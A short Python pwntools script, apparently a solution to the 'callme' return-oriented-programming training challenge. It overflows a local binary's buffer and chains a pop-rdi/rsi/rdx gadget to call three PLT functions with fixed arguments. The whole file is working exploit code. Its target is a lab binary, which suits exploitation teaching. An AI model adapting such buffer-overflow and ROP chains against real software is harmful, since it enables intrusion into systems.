from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

p = process('./callme')
elf = ELF('./callme')

p.recvuntil('>')

pop_rdi_rsi_rdx_ret = 0x401ab0

payload = flat(['a'*0x28, pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt['callme_one'], pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt['callme_two'], pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt['callme_three']])
p.sendline(payload)

p.interactive()